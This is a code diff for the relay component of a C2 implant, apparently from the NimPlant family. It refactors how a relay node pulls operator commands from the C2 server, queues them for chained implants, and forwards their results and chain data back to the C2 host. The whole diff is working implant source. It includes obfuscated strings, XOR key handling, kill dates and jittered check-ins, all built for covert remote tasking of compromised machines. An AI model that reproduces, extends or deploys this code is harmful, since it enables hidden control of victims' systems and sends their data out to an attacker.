@@ -17,6 +17,7 @@ import core/relay/[relay_protocol, relay_comm, relay_config]
 import modules/relay/relay_commands
 # Import the global relay server from relay_commands to avoid conflicts
 from modules/relay/relay_commands import g_relayServer, getConnectionStats, broadcastMessage, sendToClient, getConnectedClients
+from core/relay/relay_comm import hasQueuedCommands, getQueuedCommandsForClient, performQueueMaintenance, queueCommandForClient
 # Removed unused threadpool and locks imports
 
 # Import relay state from relay_commands module - NOW USING SAFE FUNCTIONS
@@ -198,6 +199,39 @@ proc getReconnectionDelay*(): int =
         echo "[RECONNECT] 📊 - Multiplier: " & $multiplier
         echo "[RECONNECT] 📊 - Calculated delay: " & $delay & "ms"
         echo "[RECONNECT] 📊 - Final delay (capped): " & $result & "ms"
+
+# Helper function to create relay client listeners
+proc createRelayClientListener(baseListener: Listener, clientID: string, clientKey: string = ""): Listener =
+    ## Create a specific listener for a relay client with proper configuration
+    ## This avoids the hack of modifying the relay server's listener
+    result = Listener()
+    
+    # Copy connection configuration from base listener (relay server)
+    result.listenerType = baseListener.listenerType
+    result.listenerHost = baseListener.listenerHost
+    result.implantCallbackIp = baseListener.implantCallbackIp
+    result.listenerPort = baseListener.listenerPort
+    result.registerPath = baseListener.registerPath
+    result.taskPath = baseListener.taskPath
+    result.resultPath = baseListener.resultPath
+    result.reconnectPath = baseListener.reconnectPath
+    result.userAgent = baseListener.userAgent
+    result.httpAllowCommunicationKey = baseListener.httpAllowCommunicationKey
+    result.sleepTime = baseListener.sleepTime
+    result.sleepJitter = baseListener.sleepJitter
+    result.killDate = baseListener.killDate
+    
+    # Set relay client-specific configuration
+    result.id = clientID
+    result.initialized = true  # Relay clients are always initialized through relay server
+    result.registered = true   # Relay clients are always registered through relay server
+    result.UNIQUE_XOR_KEY = if clientKey != "": clientKey else: baseListener.UNIQUE_XOR_KEY
+    
+    when defined debug:
+        echo "[DEBUG] 🔧 Created relay client listener for: " & clientID
+        echo "[DEBUG] 🔧 - ID: " & result.id
+        echo "[DEBUG] 🔧 - Key available: " & $(result.UNIQUE_XOR_KEY != "")
+        echo "[DEBUG] 🔧 - Target C2: " & result.implantCallbackIp & ":" & result.listenerPort
 
 proc recordReconnectionAttempt*() =
     ## Record a reconnection attempt for backoff tracking
@@ -957,173 +991,216 @@ proc httpHandler() {.async.} =
                                     echo "[DEBUG] 💓 PULL REQUEST: Current registry: [" & currentClients.join(", ") & "]"
                                     echo "[DEBUG] 💓 PULL REQUEST: Client in registry: " & $(msg.fromID in currentClients)
                                 
-                                # SAFE KEY MANAGEMENT: Temporarily change listener ID and encryption key to relay client's values  
-                                listener.id = msg.fromID
+                                # SAFE KEY MANAGEMENT: Prepare to extract relay client's encryption key
                             
-                            # Extract the relay client's encryption key from the PULL payload
-                            let decryptedPayload = relay_protocol.smartDecrypt(msg.payload)
-                            var relayClientKey = ""
-                            
-                            when defined debug:
-                                echo "[DEBUG] 🔍 ┌─────────── PULL KEY EXTRACTION DEBUG ───────────┐"
-                                echo "[DEBUG] 🔍 │ Raw payload length: " & $msg.payload.len & " │"
-                                echo "[DEBUG] 🔍 │ Decrypting with implantID: '" & msg.fromID & "' │"
-                                echo "[DEBUG] 🔍 │ Decrypted payload: " & decryptedPayload & " │"
-                                echo "[DEBUG] 🔍 │ Decrypted payload length: " & $decryptedPayload.len & " │"
-                                echo "[DEBUG] 🔍 └─────────────────────────────────────────────────┘"
-                            
-                            try:
-                                # Try to parse as JSON to get the encryption key
-                                let pullData = parseJson(decryptedPayload)
-                                let encryptedKey = pullData["key"].getStr()
+                                # Extract the relay client's encryption key from the PULL payload
+                                let decryptedPayload = relay_protocol.smartDecrypt(msg.payload)
+                                var relayClientKey = ""
                                 
                                 when defined debug:
-                                    echo "[DEBUG] 🔑 ┌─────────── KEY DECRYPTION DEBUG ───────────┐"
-                                    echo "[DEBUG] 🔑 │ JSON parsing successful │"
-                                    echo "[DEBUG] 🔑 │ Encrypted key from payload: " & encryptedKey & " │"
-                                    echo "[DEBUG] 🔑 │ Encrypted key length: " & $encryptedKey.len & " │"
-                                    echo "[DEBUG] 🔑 │ INITIAL_XOR_KEY: " & $INITIAL_XOR_KEY & " │"
-                                    echo "[DEBUG] 🔑 └─────────────────────────────────────────────┘"
+                                    echo "[DEBUG] 🔍 ┌─────────── PULL KEY EXTRACTION DEBUG ───────────┐"
+                                    echo "[DEBUG] 🔍 │ Raw payload length: " & $msg.payload.len & " │"
+                                    echo "[DEBUG] 🔍 │ Decrypting with implantID: '" & msg.fromID & "' │"
+                                    echo "[DEBUG] 🔍 │ Decrypted payload: " & decryptedPayload & " │"
+                                    echo "[DEBUG] 🔍 │ Decrypted payload length: " & $decryptedPayload.len & " │"
+                                    echo "[DEBUG] 🔍 └─────────────────────────────────────────────────┘"
                                 
-                                # Decrypt the relay client's encryption key using INITIAL_XOR_KEY
-                                relayClientKey = xorString(encryptedKey, INITIAL_XOR_KEY)
+                                try:
+                                    # Try to parse as JSON to get the encryption key
+                                    let pullData = parseJson(decryptedPayload)
+                                    let encryptedKey = pullData["key"].getStr()
+                                    
+                                    when defined debug:
+                                        echo "[DEBUG] 🔑 ┌─────────── KEY DECRYPTION DEBUG ───────────┐"
+                                        echo "[DEBUG] 🔑 │ JSON parsing successful │"
+                                        echo "[DEBUG] 🔑 │ Encrypted key from payload: " & encryptedKey & " │"
+                                        echo "[DEBUG] 🔑 │ Encrypted key length: " & $encryptedKey.len & " │"
+                                        echo "[DEBUG] 🔑 │ INITIAL_XOR_KEY: " & $INITIAL_XOR_KEY & " │"
+                                        echo "[DEBUG] 🔑 └─────────────────────────────────────────────┘"
+                                    
+                                    # Decrypt the relay client's encryption key using INITIAL_XOR_KEY
+                                    relayClientKey = xorString(encryptedKey, INITIAL_XOR_KEY)
+                                    
+                                    when defined debug:
+                                        echo "[DEBUG] 🔓 ┌─────────── FINAL KEY RESULT ───────────┐"
+                                        echo "[DEBUG] 🔓 │ Decrypted relayClientKey length: " & $relayClientKey.len & " │"
+                                        if relayClientKey.len > 0:
+                                            echo "[DEBUG] 🔓 │ Decrypted key preview: " & relayClientKey[0..min(7, relayClientKey.len-1)] & "... │"
+                                            echo "[DEBUG] 🔓 │ ✅ Key extraction SUCCESSFUL │"
+                                        else:
+                                            echo "[DEBUG] 🔓 │ 🚨 Key extraction FAILED - empty result │"
+                                        echo "[DEBUG] 🔓 └─────────────────────────────────────────┘"
+                                except Exception as e:
+                                    when defined debug:
+                                        echo "[DEBUG] ⚠️  Failed to extract/decrypt encryption key from PULL payload: " & msg.fromID
+                                        echo "[DEBUG] ⚠️  Error: " & e.msg
+                                        echo "[DEBUG] ⚠️  Payload: " & decryptedPayload
+                                        echo "[DEBUG] ⚠️  Using relay server's key as fallback"
                                 
+                                # Perform check-in to C2 for relay client using exported function
                                 when defined debug:
-                                    echo "[DEBUG] 🔓 ┌─────────── FINAL KEY RESULT ───────────┐"
-                                    echo "[DEBUG] 🔓 │ Decrypted relayClientKey length: " & $relayClientKey.len & " │"
-                                    if relayClientKey.len > 0:
-                                        echo "[DEBUG] 🔓 │ Decrypted key preview: " & relayClientKey[0..min(7, relayClientKey.len-1)] & "... │"
-                                        echo "[DEBUG] 🔓 │ ✅ Key extraction SUCCESSFUL │"
+                                    echo "[DEBUG] 💓 HTTP Handler: Making C2 check-in with relay client credentials"
+                                    echo "[DEBUG] 💓 HTTP Handler: Client ID: " & msg.fromID
+                                    echo "[DEBUG] 💓 HTTP Handler: Using encryption key length: " & $relayClientKey.len
+                                    echo "[DEBUG] 💓 HTTP Handler: About to call getQueuedCommand() for relay client"
+                                    echo "[DEBUG] 💓 HTTP Handler: C2 Host: " & listener.implantCallbackIp & ":" & listener.listenerPort
+                                    echo "[DEBUG] 💓 HTTP Handler: Expected to prevent LATE status for: " & msg.fromID
+                                    
+                                let checkInStartTime = epochTime()
+                                
+                                # CRITICAL FIX: Check local command queue first before going to C2
+                                var cmdGuid, cmd: string
+                                var args: seq[string]
+                                
+                                # Check if we have queued commands for this relay client
+                                if hasQueuedCommands(g_relayServer, msg.fromID):
+                                    when defined debug:
+                                        echo "[DEBUG] 💓 HTTP Handler: Found queued commands for relay client: " & msg.fromID
+                                    
+                                    # Get ONE command from local queue (FIFO - first in, first out)
+                                    let queuedCommands = getQueuedCommandsForClient(g_relayServer, msg.fromID)
+                                    if queuedCommands.len > 0:
+                                        # Process first command from queue
+                                        let queuedCmd = queuedCommands[0]
+                                        
+                                        # If there are more commands, put them back in the queue
+                                        if queuedCommands.len > 1:
+                                            when defined debug:
+                                                echo "[DEBUG] 💓 HTTP Handler: " & $(queuedCommands.len - 1) & " commands remaining, re-queueing them"
+                                            for i in 1..<queuedCommands.len:
+                                                queueCommandForClient(g_relayServer, msg.fromID, queuedCommands[i])
+                                        
+                                        # Parse command from queued message
+                                        try:
+                                            let cmdData = parseJson(queuedCmd.payload)
+                                            cmdGuid = cmdData["cmdGuid"].getStr()
+                                            cmd = cmdData["encrypted_command"].getStr()
+                                            args = @[]
+                                            if cmdData.hasKey("args"):
+                                                for arg in cmdData["args"].getElems():
+                                                    args.add(arg.getStr())
+                                            
+                                            when defined debug:
+                                                echo "[DEBUG] 💓 HTTP Handler: Parsed queued command: " & cmd
+                                                echo "[DEBUG] 💓 HTTP Handler: Command GUID: " & cmdGuid
+                                        except:
+                                            when defined debug:
+                                                echo "[DEBUG] 💓 HTTP Handler: Failed to parse queued command"
+                                            cmd = ""
+                                            cmdGuid = ""
+                                            args = @[]
                                     else:
-                                        echo "[DEBUG] 🔓 │ 🚨 Key extraction FAILED - empty result │"
-                                    echo "[DEBUG] 🔓 └─────────────────────────────────────────┘"
-                                
-                                # SAFE KEY SWAP: Use atomic key swapping to prevent desync
-                                originalKey = safeKeySwap(listener, relayClientKey)
-                                
-                                when defined debug:
-                                    echo "[DEBUG] 🔑 ✅ Safe key swap completed - using relay client encryption key"
-                                    echo "[DEBUG] 🔑 Original key length: " & $originalKey.len
-                                    echo "[DEBUG] 🔑 Relay client key length: " & $relayClientKey.len
-                            except Exception as e:
-                                when defined debug:
-                                    echo "[DEBUG] ⚠️  Failed to extract/decrypt encryption key from PULL payload: " & msg.fromID
-                                    echo "[DEBUG] ⚠️  Error: " & e.msg
-                                    echo "[DEBUG] ⚠️  Payload: " & decryptedPayload
-                                    echo "[DEBUG] ⚠️  Using relay server's key as fallback"
-                                # Keep original key if decryption fails - no key swap needed
-                                originalKey = listener.UNIQUE_XOR_KEY
-                            
-                            # Perform check-in to C2 for relay client using exported function
-                            when defined debug:
-                                echo "[DEBUG] 💓 HTTP Handler: Making C2 check-in with relay client credentials"
-                                echo "[DEBUG] 💓 HTTP Handler: Client ID: " & listener.id
-                                echo "[DEBUG] 💓 HTTP Handler: Using encryption key length: " & $listener.UNIQUE_XOR_KEY.len
-                                echo "[DEBUG] 💓 HTTP Handler: About to call getQueuedCommand() for relay client"
-                                echo "[DEBUG] 💓 HTTP Handler: C2 Host: " & listener.implantCallbackIp & ":" & listener.listenerPort
-                                echo "[DEBUG] 💓 HTTP Handler: Expected to prevent LATE status for: " & listener.id
-                                
-                            let checkInStartTime = epochTime()
-                            let (cmdGuid, cmd, args) = webClientListener.getQueuedCommand(listener)
-                            let checkInDuration = (epochTime() - checkInStartTime) * 1000.0  # Convert to ms
-                            
-                            when defined debug:
-                                echo "[DEBUG] 💓 HTTP Handler: getQueuedCommand() completed in " & $checkInDuration.int & "ms"
-                                echo "[DEBUG] 💓 HTTP Handler: Raw response analysis:"
-                                echo "[DEBUG] 💓 HTTP Handler: - Command empty: " & $(cmd == "")
-                                echo "[DEBUG] 💓 HTTP Handler: - Command is connection error: " & $(cmd == obf("NIMPLANT_CONNECTION_ERROR"))
-                                if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
-                                    echo "[DEBUG] 💓 HTTP Handler: ❌ CHECK-IN FAILED - C2 CONNECTION ERROR"
-                                    echo "[DEBUG] 💓 HTTP Handler: ❌ Relay client " & msg.fromID & " will be marked as LATE!"
-                                elif cmd == "":
-                                    echo "[DEBUG] 💓 HTTP Handler: ✅ CHECK-IN SUCCESSFUL - No commands for " & msg.fromID
+                                        cmd = ""
+                                        cmdGuid = ""
+                                        args = @[]
                                 else:
-                                    echo "[DEBUG] 💓 HTTP Handler: ✅ CHECK-IN SUCCESSFUL - Got command for " & msg.fromID
-                                    echo "[DEBUG] 💓 HTTP Handler: - Command content: '" & cmd & "'"
-                                    echo "[DEBUG] 💓 HTTP Handler: - Command length: " & $cmd.len
-                                echo "[DEBUG] 💓 HTTP Handler: - GUID content: '" & cmdGuid & "'"
-                                echo "[DEBUG] 💓 HTTP Handler: - Args count: " & $args.len
-                                if args.len > 0:
-                                    echo "[DEBUG] 💓 HTTP Handler: - Args: " & $args
-                            
-                            # SAFE KEY RESTORATION: Restore original listener ID and encryption key AFTER processing response
-                            listener.id = originalId
-                            safeKeyRestore(listener, originalKey)
-                            
-                            # SECURITY: Clear the relay client's encryption key from memory AFTER all operations
-                            clearSensitiveKey(relayClientKey)
-                            
-                            # CRITICAL: ALWAYS send a response to PULL requests!
-                            if cmd != "" and cmd != obf("NIMPLANT_CONNECTION_ERROR"):
-                                when defined debug:
-                                    echo "[DEBUG] 🌐 HTTP Handler: Sending command to relay client: " & cmd
-                                    echo "[DEBUG] 🌐 HTTP Handler: Command GUID: " & cmdGuid
-                                
-                                # SIMPLIFIED APPROACH: C2 response is ALREADY encrypted with client's UNIQUE_KEY
-                                # Relay server CANNOT and SHOULD NOT read this - it's end-to-end encrypted
-                                # Just forward it using INITIAL_XOR_KEY (hop-to-hop encryption)
-                                
-                                when defined debug:
-                                    echo "[DEBUG] 🔐 SIMPLIFIED ENCRYPTION: End-to-end + hop-to-hop"
-                                    echo "[DEBUG] 🔐 - C2 → Client: UNIQUE_KEY (end-to-end, relay can't read)"
-                                    echo "[DEBUG] 🔐 - Relay → Client: INITIAL_XOR_KEY (hop-to-hop transport)"
-                                    echo "[DEBUG] 🔐 - Command already encrypted by C2 with client's UNIQUE_KEY"
-                                
-                                # Create simple command payload (C2 response is already encrypted)
-                                let forwardPayload = %*{
-                                    "cmdGuid": cmdGuid,
-                                    "encrypted_command": cmd,  # Already encrypted by C2 with client's UNIQUE_KEY
-                                    "args": args
-                                }
-                                
-                                # Create command message with SHARED KEY (hop-to-hop encryption)
-                                let cmdMsg = createMessage(COMMAND,
-                                    getRelayServerID(),
-                                    msg.route,
-                                    $forwardPayload,
-                                    false  # Use SHARED KEY (INITIAL_XOR_KEY) for hop-to-hop
-                                )
-                                
-                                # CRITICAL DEBUG: Check client registry before sending command
-                                when defined debug:
-                                    echo "[DEBUG] 🎯 COMMAND ROUTING: Attempting to send command to client: '" & msg.fromID & "'"
-                                    let connectedClients = relay_commands.getConnectedClients(g_relayServer)
-                                    echo "[DEBUG] 🎯 COMMAND ROUTING: Connected clients: [" & connectedClients.join(", ") & "]"
-                                    echo "[DEBUG] 🎯 COMMAND ROUTING: Target client in registry: " & $(msg.fromID in connectedClients)
-                                
-                                # Send command to SPECIFIC relay client (unicast)
-                                let success = relay_commands.sendToClient(g_relayServer, msg.fromID, cmdMsg)
-                                if success:
+                                    # No local commands, check C2 as fallback
                                     when defined debug:
-                                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Command sent to specific client: " & msg.fromID
-                                else:
-                                    when defined debug:
-                                        echo "[DEBUG] 🌐 HTTP Handler: ❌ Failed to send command to client: " & msg.fromID
-                                        echo "[DEBUG] 🚨 COMMAND ROUTING FAILURE: Client '" & msg.fromID & "' not found in registry!"
-                                        echo "[DEBUG] 🚨 This means the auto-registration failed or client registry is corrupted!"
-                            else:
-                                # NO COMMANDS or CONNECTION ERROR - Still send a response!
+                                        echo "[DEBUG] 💓 HTTP Handler: No local commands, checking C2 for relay client: " & msg.fromID
+                                    
+                                    # CLEAN FIX: Create dedicated relay client listener for getQueuedCommand()
+                                    let relayClientListener = createRelayClientListener(listener, msg.fromID, relayClientKey)
+                                    
+                                    let (c2CmdGuid, c2Cmd, c2Args) = webClientListener.getQueuedCommand(relayClientListener)
+                                    cmdGuid = c2CmdGuid
+                                    cmd = c2Cmd
+                                    args = c2Args
+                                
+                                let checkInDuration = (epochTime() - checkInStartTime) * 1000.0  # Convert to ms
+                                
                                 when defined debug:
+                                    echo "[DEBUG] 💓 HTTP Handler: getQueuedCommand() completed in " & $checkInDuration.int & "ms"
+                                    echo "[DEBUG] 💓 HTTP Handler: Raw response analysis:"
+                                    echo "[DEBUG] 💓 HTTP Handler: - Command empty: " & $(cmd == "")
+                                    echo "[DEBUG] 💓 HTTP Handler: - Command is connection error: " & $(cmd == obf("NIMPLANT_CONNECTION_ERROR"))
                                     if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
-                                        echo "[DEBUG] 🌐 HTTP Handler: ⚠️  C2 connection error for relay client " & msg.fromID & " - sending empty response"
+                                        echo "[DEBUG] 💓 HTTP Handler: ❌ CHECK-IN FAILED - C2 CONNECTION ERROR"
+                                        echo "[DEBUG] 💓 HTTP Handler: ❌ Relay client " & msg.fromID & " will be marked as LATE!"
+                                    elif cmd == "":
+                                        echo "[DEBUG] 💓 HTTP Handler: ✅ CHECK-IN SUCCESSFUL - No commands for " & msg.fromID
                                     else:
-                                        echo "[DEBUG] 🌐 HTTP Handler: 📭 No commands for relay client " & msg.fromID & " - sending empty response"
+                                        echo "[DEBUG] 💓 HTTP Handler: ✅ CHECK-IN SUCCESSFUL - Got command for " & msg.fromID
+                                        echo "[DEBUG] 💓 HTTP Handler: - Command content: '" & cmd & "'"
+                                        echo "[DEBUG] 💓 HTTP Handler: - Command length: " & $cmd.len
+                                    echo "[DEBUG] 💓 HTTP Handler: - GUID content: '" & cmdGuid & "'"
+                                    echo "[DEBUG] 💓 HTTP Handler: - Args count: " & $args.len
+                                    if args.len > 0:
+                                        echo "[DEBUG] 💓 HTTP Handler: - Args: " & $args
                                 
-                                # Send empty response to complete the PULL cycle
-                                let emptyResponse = createMessage(HTTP_RESPONSE,
-                                    getRelayServerID(),
-                                    msg.route,
-                                    "NO_COMMANDS"
-                                )
+                                # SECURITY: Clear the relay client's encryption key from memory AFTER all operations
+                                clearSensitiveKey(relayClientKey)
                                 
-                                # Send empty response to SPECIFIC relay client (unicast)
-                                let success = relay_commands.sendToClient(g_relayServer, msg.fromID, emptyResponse)
-                                if success:
+                                # CRITICAL: ALWAYS send a response to PULL requests!
+                                if cmd != "" and cmd != obf("NIMPLANT_CONNECTION_ERROR"):
                                     when defined debug:
-                                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Empty response sent to specific client: " & msg.fromID & " (PULL completed)"
+                                        echo "[DEBUG] 🌐 HTTP Handler: Sending command to relay client: " & cmd
+                                        echo "[DEBUG] 🌐 HTTP Handler: Command GUID: " & cmdGuid
+                                    
+                                    # SIMPLIFIED APPROACH: C2 response is ALREADY encrypted with client's UNIQUE_KEY
+                                    # Relay server CANNOT and SHOULD NOT read this - it's end-to-end encrypted
+                                    # Just forward it using INITIAL_XOR_KEY (hop-to-hop encryption)
+                                    
+                                    when defined debug:
+                                        echo "[DEBUG] 🔐 SIMPLIFIED ENCRYPTION: End-to-end + hop-to-hop"
+                                        echo "[DEBUG] 🔐 - C2 → Client: UNIQUE_KEY (end-to-end, relay can't read)"
+                                        echo "[DEBUG] 🔐 - Relay → Client: INITIAL_XOR_KEY (hop-to-hop transport)"
+                                        echo "[DEBUG] 🔐 - Command already encrypted by C2 with client's UNIQUE_KEY"
+                                    
+                                    # Create simple command payload (C2 response is already encrypted)
+                                    let forwardPayload = %*{
+                                        "cmdGuid": cmdGuid,
+                                        "encrypted_command": cmd,  # Already encrypted by C2 with client's UNIQUE_KEY
+                                        "args": args
+                                    }
+                                    
+                                    # Create command message with SHARED KEY (hop-to-hop encryption)
+                                    let cmdMsg = createMessage(COMMAND,
+                                        getRelayServerID(),
+                                        msg.route,
+                                        $forwardPayload,
+                                        false  # Use SHARED KEY (INITIAL_XOR_KEY) for hop-to-hop
+                                    )
+                                    
+                                    # CRITICAL DEBUG: Check client registry before sending command
+                                    when defined debug:
+                                        echo "[DEBUG] 🎯 COMMAND ROUTING: Attempting to send command to client: '" & msg.fromID & "'"
+                                        let connectedClients = relay_commands.getConnectedClients(g_relayServer)
+                                        echo "[DEBUG] 🎯 COMMAND ROUTING: Connected clients: [" & connectedClients.join(", ") & "]"
+                                        echo "[DEBUG] 🎯 COMMAND ROUTING: Target client in registry: " & $(msg.fromID in connectedClients)
+                                    
+                                    # Send command to SPECIFIC relay client (unicast)
+                                    let success = relay_commands.sendToClient(g_relayServer, msg.fromID, cmdMsg)
+                                    if success:
+                                        when defined debug:
+                                            echo "[DEBUG] 🌐 HTTP Handler: ✅ Command sent to specific client: " & msg.fromID
+                                    else:
+                                        when defined debug:
+                                            echo "[DEBUG] 🌐 HTTP Handler: ❌ Failed to send command to client: " & msg.fromID
+                                            echo "[DEBUG] 🚨 COMMAND ROUTING FAILURE: Client '" & msg.fromID & "' not found in registry!"
+                                            echo "[DEBUG] 🚨 This means the auto-registration failed or client registry is corrupted!"
                                 else:
+                                    # NO COMMANDS or CONNECTION ERROR - Still send a response!
                                     when defined debug:
-                                        echo "[DEBUG] 🌐 HTTP Handler: ❌ Failed to send empty response to client: " & msg.fromID
+                                        if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
+                                            echo "[DEBUG] 🌐 HTTP Handler: ⚠️  C2 connection error for relay client " & msg.fromID & " - sending empty response"
+                                        else:
+                                            echo "[DEBUG] 🌐 HTTP Handler: 📭 No commands for relay client " & msg.fromID & " - sending empty response"
+                                    
+                                    # Send empty response to complete the PULL cycle
+                                    let emptyResponse = createMessage(HTTP_RESPONSE,
+                                        getRelayServerID(),
+                                        msg.route,
+                                        "NO_COMMANDS"
+                                    )
+                                    
+                                    # Send empty response to SPECIFIC relay client (unicast)
+                                    let success = relay_commands.sendToClient(g_relayServer, msg.fromID, emptyResponse)
+                                    if success:
+                                        when defined debug:
+                                            echo "[DEBUG] 🌐 HTTP Handler: ✅ Empty response sent to specific client: " & msg.fromID & " (PULL completed)"
+                                    else:
+                                        when defined debug:
+                                            echo "[DEBUG] 🌐 HTTP Handler: ❌ Failed to send empty response to client: " & msg.fromID
                                 # End of ROOT RELAY SERVER processing
                         
                         of RESPONSE:
@@ -1177,26 +1254,11 @@ proc httpHandler() {.async.} =
                                 echo "[DEBUG] 🌐 HTTP Handler: Sending relay result to C2..."
                                 echo "[DEBUG] 🌐 HTTP Handler: Using cmdGuid: " & responseCmdGuid & " for client: " & msg.fromID
                             
-                            # SAFE KEY MANAGEMENT: Temporarily change listener ID and encryption key to relay client's values
-                            let originalId = listener.id
-                            var originalKey = listener.UNIQUE_XOR_KEY  # Default to current key
-                            listener.id = msg.fromID
+                            # CLEAN FIX: Create dedicated relay client listener for C2 result submission
+                            let relayClientListener = createRelayClientListener(listener, msg.fromID, relayClientKey)
                             
-                            # Use the relay client's encryption key if available
-                            if relayClientKey != "":
-                                originalKey = safeKeySwap(listener, relayClientKey)
-                                when defined debug:
-                                    echo "[DEBUG] 🔑 ✅ Safe key swap for C2 result submission"
-                            else:
-                                when defined debug:
-                                    echo "[DEBUG] ⚠️  HTTP Handler: No encryption key from relay client, using relay server's key"
-                            
-                            # Send result to C2 with correct cmdGuid using exported function
-                            webClientListener.postCommandResults(listener, responseCmdGuid, actualResult)
-                            
-                            # SAFE KEY RESTORATION: Restore original listener ID and encryption key
-                            listener.id = originalId
-                            safeKeyRestore(listener, originalKey)
+                            # Send result to C2 with correct cmdGuid using dedicated listener
+                            webClientListener.postCommandResults(relayClientListener, responseCmdGuid, actualResult)
                             
                             # SECURITY: Clear the relay client's encryption key from memory
                             clearSensitiveKey(relayClientKey)
@@ -1235,9 +1297,6 @@ proc httpHandler() {.async.} =
                                 echo "[DEBUG] 🔗 HTTP Handler: Double-encrypted payload length: " & $msg.payload.len
                                 echo "[DEBUG] 🔗 HTTP Handler: Forwarding directly to C2 without touching encryption"
                             
-                            # Declare variables outside try block for exception handling
-                            var originalId = listener.id
-                            
                             try:
                                 # PURE FORWARDING: Just forward the double-encrypted message to C2
                                 # C2 will handle: 1) INITIAL_XOR_KEY decrypt, 2) UNIQUE_KEY decrypt
@@ -1246,31 +1305,22 @@ proc httpHandler() {.async.} =
                                     echo "[DEBUG] 🔗 Chain Info: ✅ ULTRA-SIMPLE forwarding - relay doesn't decrypt anything"
                                     echo "[DEBUG] 🔗 Chain Info: ✅ C2 will handle double decryption"
                                 
-                                # Temporarily impersonate the relay client for C2 forwarding
-                                originalId = listener.id
-                                listener.id = msg.fromID
+                                # CLEAN FIX: Create dedicated relay client listener for C2 forwarding
+                                let relayClientListener = createRelayClientListener(listener, msg.fromID)
                                 
                                 when defined debug:
-                                    echo "[DEBUG] 🔗 Chain Info: ✅ Impersonating relay client ID: " & msg.fromID
+                                    echo "[DEBUG] 🔗 Chain Info: ✅ Using dedicated relay client listener: " & msg.fromID
                                 
                                 # Send the raw double-encrypted payload directly to C2
                                 # C2 endpoint /chain will handle double decryption
-                                postRawData(listener, "/chain", msg.payload)
+                                postRawData(relayClientListener, "/chain", msg.payload)
                                 
                                 when defined debug:
                                     echo "[DEBUG] 🔗 Chain Info: ✅ Raw double-encrypted data forwarded to C2"
                                 
-                                # Restore original listener credentials
-                                listener.id = originalId
-                                
                             except Exception as e:
                                 when defined debug:
                                     echo "[DEBUG] 🔗 Chain Info: ❌ Error forwarding chain info: " & e.msg
-                                # Ensure listener credentials are restored on error
-                                try:
-                                    listener.id = originalId
-                                except:
-                                    discard
                         
                         of CONFIRMATION:
                             when defined debug:
@@ -1661,6 +1711,18 @@ proc httpHandler() {.async.} =
             except Exception as chainError:
                 when defined debug:
                     echo "[DEBUG] 🔗 Chain Info: Error: " & chainError.msg
+            
+            # HYBRID QUEUE MAINTENANCE: Perform periodic cleanup (every 60 cycles ≈ 5 minutes)
+            if g_relayServer.isListening and (httpCycleCount mod 60 == 0):
+                when defined debug:
+                    echo "[DEBUG] 🔧 Performing periodic queue maintenance (cycle " & $httpCycleCount & ")"
+                try:
+                    performQueueMaintenance(g_relayServer)
+                    when defined debug:
+                        echo "[DEBUG] 🔧 Queue maintenance completed successfully"
+                except Exception as queueError:
+                    when defined debug:
+                        echo "[DEBUG] 🔧 Queue maintenance error: " & queueError.msg
             
             await sleepAsync(totalSleepMs)
             
